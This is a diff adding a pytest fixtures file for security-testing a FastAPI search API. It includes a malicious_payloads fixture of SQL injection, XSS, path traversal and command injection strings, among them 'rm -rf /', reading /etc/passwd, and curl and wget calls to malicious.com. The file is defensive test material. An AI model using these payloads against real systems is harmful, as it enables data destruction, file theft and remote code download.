@@ -1,0 +1,320 @@
+"""
+Shared fixtures and configuration for search security tests
+"""
+
+import pytest
+import asyncio
+from unittest.mock import AsyncMock, Mock, patch
+from fastapi.testclient import TestClient
+from sqlalchemy.orm import Session
+from typing import Dict, Any, List, Generator
+import uuid
+import time
+from datetime import datetime, timedelta
+import json
+from httpx import AsyncClient
+
+from src.main import app
+from src.core.database import get_db
+from src.core.dependencies import get_current_user
+from src.models.user import User
+from src.models.organization import Organization
+from src.models.search_schemas import SearchQuery, SearchType
+
+
+class SecurityTestClient:
+    """Enhanced test client for security testing"""
+    
+    def __init__(self, client: TestClient):
+        self.client = client
+        self.request_count = 0
+        self.request_history: List[Dict[str, Any]] = []
+    
+    def make_request(self, method: str, url: str, **kwargs):
+        """Make a request and track it for rate limiting tests"""
+        self.request_count += 1
+        start_time = time.time()
+        
+        response = getattr(self.client, method.lower())(url, **kwargs)
+        
+        end_time = time.time()
+        self.request_history.append({
+            'method': method,
+            'url': url,
+            'timestamp': start_time,
+            'response_time': end_time - start_time,
+            'status_code': response.status_code,
+            'kwargs': kwargs
+        })
+        
+        return response
+    
+    def reset_tracking(self):
+        """Reset request tracking"""
+        self.request_count = 0
+        self.request_history.clear()
+
+
+@pytest.fixture
+def security_test_client():
+    """Create enhanced test client for security testing"""
+    client = TestClient(app)
+    return SecurityTestClient(client)
+
+
+@pytest.fixture
+def mock_db():
+    """Mock database session"""
+    db = Mock(spec=Session)
+    return db
+
+
+@pytest.fixture
+def test_user():
+    """Create a test user for authentication tests"""
+    return User(
+        id=uuid.uuid4(),
+        email="test@example.com",
+        username="testuser",
+        is_active=True,
+        is_verified=True,
+        organization_id=uuid.uuid4(),
+        role="user"
+    )
+
+
+@pytest.fixture
+def admin_user():
+    """Create an admin user for authorization tests"""
+    return User(
+        id=uuid.uuid4(),
+        email="admin@example.com",
+        username="admin",
+        is_active=True,
+        is_verified=True,
+        organization_id=uuid.uuid4(),
+        role="admin"
+    )
+
+
+@pytest.fixture
+def test_organization():
+    """Create a test organization"""
+    return Organization(
+        id=uuid.uuid4(),
+        name="Test Organization",
+        is_active=True
+    )
+
+
+@pytest.fixture
+def malicious_payloads():
+    """Collection of malicious payloads for testing"""
+    return {
+        'sql_injection': [
+            "'; DROP TABLE documents; --",
+            "' OR '1'='1",
+            "' UNION SELECT * FROM users --",
+            "'; INSERT INTO documents VALUES('malicious'); --",
+            "' OR 1=1; --",
+            "\"; DROP TABLE documents; --",
+            "1' AND '1'='1",
+            "admin'--",
+            "1' OR '1'='1' /*",
+            "'; EXEC xp_cmdshell('dir'); --"
+        ],
+        'xss_payloads': [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "javascript:alert('XSS')",
+            "<svg onload=alert('XSS')>",
+            "<iframe src=javascript:alert('XSS')></iframe>",
+            "<body onload=alert('XSS')>",
+            "<input onfocus=alert('XSS') autofocus>",
+            "<select onfocus=alert('XSS') autofocus>",
+            "<textarea onfocus=alert('XSS') autofocus>",
+            "'>alert('XSS')<'",
+            "\"><script>alert('XSS')</script>",
+            "<script>document.cookie='stolen'</script>"
+        ],
+        'command_injection': [
+            "; ls -la",
+            "| cat /etc/passwd",
+            "&& rm -rf /",
+            "; curl http://malicious.com",
+            "$(whoami)",
+            "`id`",
+            "${USER}",
+            "|nc -l 4444",
+            "; python -c 'import os; os.system(\"rm -rf /\")'",
+            "&& wget http://malicious.com/script.sh"
+        ],
+        'path_traversal': [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+            "....//....//....//etc/passwd",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "..%252f..%252f..%252fetc%252fpasswd",
+            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+        ],
+        'buffer_overflow': [
+            "A" * 10000,
+            "A" * 100000,
+            "\x00" * 1000,
+            "\xff" * 1000
+        ],
+        'unicode_attacks': [
+            "\u202e",  # Right-to-left override
+            "\u2066",  # Left-to-right isolate
+            "\u2067",  # Right-to-left isolate
+            "\ufeff",  # Zero width no-break space
+            "\u200d",  # Zero width joiner
+            "\u200c",  # Zero width non-joiner
+        ],
+        'null_byte_injection': [
+            "test\x00.txt",
+            "search\x00'; DROP TABLE documents; --",
+            "query\x00<script>alert('xss')</script>"
+        ]
+    }
+
+
+@pytest.fixture
+def valid_search_payloads():
+    """Collection of valid search payloads for comparison tests"""
+    return [
+        {"query": "machine learning", "search_type": "fulltext"},
+        {"query": "neural networks", "search_type": "hybrid"},
+        {"query": "artificial intelligence", "search_type": "semantic"},
+        {"query": "data science", "search_type": "graph"},
+        {"query": "python programming", "search_type": "fulltext", "limit": 10},
+        {"query": "deep learning", "search_type": "hybrid", "offset": 5},
+    ]
+
+
+@pytest.fixture
+def authentication_headers():
+    """Generate various authentication headers for testing"""
+    return {
+        'valid_jwt': {'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.valid_token'},
+        'invalid_jwt': {'Authorization': 'Bearer invalid_token'},
+        'malformed_jwt': {'Authorization': 'Bearer not.a.jwt'},
+        'expired_jwt': {'Authorization': 'Bearer expired_token'},
+        'missing_bearer': {'Authorization': 'invalid_token'},
+        'valid_api_key': {'X-API-Key': 'valid_api_key_12345'},
+        'invalid_api_key': {'X-API-Key': 'invalid_key'},
+        'empty_auth': {'Authorization': ''},
+        'no_auth': {}
+    }
+
+
+@pytest.fixture
+async def rate_limiter_mock():
+    """Mock rate limiter for testing"""
+    rate_limiter = Mock()
+    rate_limiter.is_allowed = Mock(return_value=True)
+    rate_limiter.get_remaining = Mock(return_value=100)
+    rate_limiter.get_reset_time = Mock(return_value=time.time() + 3600)
+    return rate_limiter
+
+
+@pytest.fixture
+def security_logger_mock():
+    """Mock security logger for testing log events"""
+    with patch('src.core.security_logger') as mock_logger:
+        mock_logger.log_security_event = Mock()
+        mock_logger.log_suspicious_activity = Mock()
+        mock_logger.log_authentication_failure = Mock()
+        yield mock_logger
+
+
+@pytest.fixture
+def search_service_mocks():
+    """Mock all search services to isolate endpoint testing"""
+    mocks = {}
+    
+    with patch('src.services.search.hybrid_search_service.hybrid_search_service') as hybrid_mock:
+        with patch('src.services.search.fulltext_search_service.fulltext_search_service') as fulltext_mock:
+            with patch('src.services.search.vector_search_service.vector_search_service') as vector_mock:
+                
+                # Configure mock responses
+                mock_response = {
+                    'results': [],
+                    'total': 0,
+                    'search_time_ms': 50,
+                    'query': 'test'
+                }
+                
+                hybrid_mock.search.return_value = mock_response
+                fulltext_mock.search.return_value = mock_response
+                vector_mock.search.return_value = mock_response
+                fulltext_mock._get_search_suggestions.return_value = ['suggestion1', 'suggestion2']
+                
+                mocks['hybrid'] = hybrid_mock
+                mocks['fulltext'] = fulltext_mock
+                mocks['vector'] = vector_mock
+                
+                yield mocks
+
+
+class SecurityTestCase:
+    """Base class for security test cases"""
+    
+    def assert_no_information_disclosure(self, response, sensitive_patterns: List[str]):
+        """Assert response doesn't disclose sensitive information"""
+        response_text = response.text.lower()
+        for pattern in sensitive_patterns:
+            assert pattern.lower() not in response_text, f"Sensitive information disclosed: {pattern}"
+    
+    def assert_security_headers(self, response):
+        """Assert security headers are present"""
+        security_headers = [
+            'x-content-type-options',
+            'x-frame-options',
+            'x-xss-protection'
+        ]
+        
+        for header in security_headers:
+            assert header in response.headers, f"Missing security header: {header}"
+    
+    def assert_safe_error_response(self, response):
+        """Assert error response is safe and doesn't leak information"""
+        assert response.status_code in [400, 401, 403, 422, 429, 500]
+        
+        # Check that error doesn't contain sensitive information
+        sensitive_patterns = [
+            'database',
+            'sql',
+            'internal',
+            'stack trace',
+            'traceback',
+            'file path',
+            '/src/',
+            'password',
+            'secret',
+            'token'
+        ]
+        
+        self.assert_no_information_disclosure(response, sensitive_patterns)
+
+
+@pytest.fixture
+def security_test_base():
+    """Provide SecurityTestCase instance for tests"""
+    return SecurityTestCase()
+
+
+# Async fixtures for async tests
+@pytest.fixture
+def event_loop():
+    """Create an instance of the default event loop for the test session."""
+    loop = asyncio.new_event_loop()
+    yield loop
+    loop.close()
+
+
+@pytest.fixture
+async def async_client():
+    """Async test client for async endpoint testing"""
+    async with AsyncClient(app=app, base_url="http://test") as client:
+        yield client
